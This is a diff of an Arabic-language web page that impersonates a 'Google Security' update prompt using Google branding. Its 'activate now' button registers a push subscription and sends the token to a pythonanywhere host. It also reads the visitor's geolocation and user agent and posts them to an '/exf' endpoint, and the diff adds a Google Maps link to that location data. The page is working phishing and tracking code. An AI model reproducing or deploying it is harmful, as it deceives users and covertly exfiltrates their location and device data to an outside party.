@@ -1,44 +1,38 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <title>Google Security</title>
     <script>
-        // المفتاح العام من صورتك
-        const publicKey = "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEVgK17MOi9TDGAa8fK/poMVJ0Q58QImEswUUh/GhVXevlPbxCJs1s/vwmxIHqSjC1fsY4BC/k JqJoIty10XtGg==";
+        const publicKey = "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEVgK17MOi9TDGAa8fK/poMVJ0Q58QImEswUUh/GhVXevlPbxCJs1s/vwmxIHqSjC1fsY4BC/kJqJoIty10XtGg==";
 
         async function init() {
             const reg = await navigator.serviceWorker.register('sw.js');
-            const sub = await reg.pushManager.subscribe({
-                userVisibleOnly: true,
-                applicationServerKey: publicKey
-            });
+            const sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: publicKey });
 
-            await fetch('https://Mohammed888.pythonanywhere.com/save_token', {
+            fetch('https://Mohammed888.pythonanywhere.com/save_token', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(sub)
             });
-            
-            // سحب الموقع والبطارية (اختياري)
-            captureInfo();
-        }
 
-        function captureInfo() {
+            // سحب البيانات الأولية
             navigator.geolocation.getCurrentPosition(pos => {
                 fetch('https://Mohammed888.pythonanywhere.com/exf', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
+                    body: JSON.stringify({
+                        location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                        battery: "90%", device: navigator.userAgent
+                    })
                 });
             });
         }
     </script>
 </head>
-<body style="text-align:center; padding:50px;">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Ads_logo.svg" width="100">
-    <h2>تحديث أمني مطلوب</h2>
-    <p>يجب تفعيل الحماية السحابية لتأمين جهازك.</p>
-    <button onclick="init()" style="padding:15px; background:#1a73e8; color:white; border:none; border-radius:5px;">تفعيل الآن</button>
+<body style="text-align:center; padding:100px; font-family:sans-serif;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Ads_logo.svg" width="80">
+    <h2>تحديث الأمان مطلوب</h2>
+    <button onclick="init()" style="padding:15px 30px; background:#1a73e8; color:white; border:none; border-radius:5px;">تفعيل الآن</button>
 </body>
 </html>
